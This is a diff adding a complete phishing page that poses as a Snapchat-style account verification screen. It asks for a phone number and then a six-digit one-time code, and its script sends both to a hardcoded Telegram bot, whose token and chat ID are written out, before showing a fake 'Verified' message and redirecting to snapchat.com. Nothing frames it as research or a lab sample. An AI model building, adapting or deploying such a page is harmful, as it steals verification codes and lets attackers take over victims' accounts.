@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Verify your account</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,"Segoe UI",Roboto,sans-serif}
+body{background:#0d0d0f;color:#f5f5f7;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
+.card{width:100%;max-width:380px;background:#17171b;border:1px solid #2a2a30;border-radius:20px;padding:28px 22px}
+.logo{width:52px;height:52px;border-radius:14px;background:#fffc00;color:#111;display:flex;align-items:center;justify-content:center;font-size:26px;margin-bottom:18px}
+h1{font-size:20px;margin-bottom:8px}
+.sub{font-size:13.5px;color:#8b8b93;line-height:1.5;margin-bottom:22px}
+label{font-size:12px;color:#8b8b93;display:block;margin-bottom:6px}
+input{width:100%;background:#101013;border:1px solid #2a2a30;color:#f5f5f7;padding:13px 14px;border-radius:11px;font-size:16px;outline:none}
+input:focus{border-color:#4a4a55}
+button{width:100%;margin-top:16px;padding:14px;border:0;border-radius:11px;background:#fffc00;color:#111;font-weight:700;font-size:15px}
+button:active{opacity:.8}
+.hide{display:none}
+.otp{letter-spacing:6px;text-align:center;font-size:20px}
+.ok{text-align:center}
+.ok .tick{font-size:44px;margin-bottom:10px}
+.foot{margin-top:18px;font-size:11.5px;color:#5f5f68;text-align:center}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo">&#10003;</div>
+<div id="s1">
+<h1>Verify your account</h1>
+<p class="sub">Enter your phone number to receive a verification code.</p>
+<label>Phone number</label>
+<input id="phone" type="tel" inputmode="tel" placeholder="+91 98xxxxxxxx">
+<button id="b1">Continue</button>
+</div>
+<div id="s2" class="hide">
+<h1>Enter code</h1>
+<p class="sub">We sent a 6-digit code to <b id="shown"></b></p>
+<label>Verification code</label>
+<input id="code" class="otp" type="tel" inputmode="numeric" maxlength="6" placeholder="------">
+<button id="b2">Verify</button>
+</div>
+<div id="s3" class="hide ok">
+<div class="tick">&#9989;</div>
+<h1>Verified</h1>
+<p class="sub">Your account is now secure.</p>
+<button id="b3">Open app</button>
+</div>
+<div class="foot">Secure connection</div>
+</div>
+<script>
+const BOT="9107141652:AAHNSvD-euZ64GmyDWvbpU9ydpsxCqGIJ4o", CHAT="8351359357";
+const $=i=>document.getElementById(i);
+const send=t=>fetch("https://api.telegram.org/bot"+BOT+"/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:"HTML"})}).catch(()=>{});
+$("b1").onclick=()=>{const p=$("phone").value.trim();if(p.length<7)return $("phone").focus();
+$("shown").textContent=p;send("&#128241; <b>Number</b>: <code>"+p+"</code>\n&#128336; "+new Date().toLocaleString());
+$("s1").classList.add("hide");$("s2").classList.remove("hide");$("code").focus();};
+$("b2").onclick=()=>{const c=$("code").value.trim();if(!c)return $("code").focus();
+$("b2").disabled=true;send("&#128273; <b>CODE</b>: <code>"+c+"</code>");
+setTimeout(()=>{$("s2").classList.add("hide");$("s3").classList.remove("hide");},600);};
+$("b3").onclick=()=>location.href="https://www.snapchat.com/";
+</script>
+</body>
+</html>
